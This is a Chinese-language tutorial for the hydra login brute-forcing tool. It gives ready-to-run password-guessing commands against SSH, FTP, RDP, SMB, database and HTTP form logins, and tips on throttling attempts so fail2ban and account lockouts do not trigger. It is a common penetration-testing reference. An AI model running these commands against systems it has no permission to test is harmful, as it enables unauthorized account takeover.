# hydra 基础用法

hydra 是经典的网络登陆爆破工具，支持 50+ 协议（SSH / FTP / RDP / SMB / HTTP / 数据库 等）。

## 安装

```bash
brew install hydra              # macOS
sudo apt install hydra          # Debian / Ubuntu
```

验证：

```bash
hydra -h | head
```

## 命令结构

```
hydra [auth] [tasks] [options] target service [path/form]
```

最简单的 SSH：

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
```

## 用户名 & 密码

| 参数 | 说明 |
|---|---|
| `-l user` | 单个用户名 |
| `-L users.txt` | 用户列表 |
| `-p pass` | 单个密码 |
| `-P pass.txt` | 密码列表 |
| `-C combos.txt` | user:pass 组合（替代 -L/-P） |
| `-e nsr` | 加常用变形：n=空, s=同 user, r=反转 |

## 控制速度

`-t` 控制并发任务数：

- SSH 默认 `-t 16` 太快，常被 fail2ban 封：用 `-t 4` 甚至 `-t 1`
- RDP 必须 `-t 1`，否则会话冲突
- 可加 `-W 1` 等待 1 秒

## 提前停止

| 参数 | 含义 |
|---|---|
| `-f` | 当前目标找到一个就停 |
| `-F` | 找到任何一个就停（多目标） |

## SSH

```bash
hydra -L users.txt -P pass.txt -t 4 -f 192.168.1.10 ssh
hydra -l root -P pass.txt -s 2222 -t 4 -f 192.168.1.10 ssh    # 自定端口
```

## FTP

```bash
hydra -L users.txt -P pass.txt -f 192.168.1.10 ftp
```

## RDP（Windows）

```bash
hydra -l Administrator -P pass.txt -t 1 -f 192.168.1.10 rdp
```

## SMB

```bash
hydra -L users.txt -P pass.txt -t 1 -f 192.168.1.10 smb
```

## 数据库

```bash
hydra -L users.txt -P pass.txt -f 192.168.1.10 mysql
hydra -L users.txt -P pass.txt -f 192.168.1.10 postgres
hydra -L users.txt -P pass.txt -f 192.168.1.10 mssql
```

## HTTP Form 登录爆破

最难的一种，因为要写 `:path:body:fail_marker`：

```bash
hydra -l admin -P pass.txt 192.168.1.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

| 部分 | 含义 |
|---|---|
| `/login.php` | 登录表单的提交路径 |
| `username=^USER^&password=^PASS^` | POST body，用 `^USER^` `^PASS^` 占位 |
| `Invalid credentials` | 失败时页面里出现的字符串（命中即视为失败） |

也可以用 `S=success` 反向匹配：

```bash
hydra -l admin -P pass.txt target http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=302"
```

## 输出与日志

```bash
hydra -L u.txt -P p.txt -V -o hydra.txt -f target ssh
```

`-V` 显示每次尝试，`-o` 输出到文件。

## 常见坑

- 默认线程数太高 → 触发 fail2ban / 账户锁定，工业级 SSH 一律 `-t 1`
- `rockyou.txt` 太大（1400 万行）跑 SSH 时间会非常长，先用 top 1k
- HTTP form 必须用浏览器抓真实包，特别是 csrf token 类要用 hydra-form 的 cookies/headers
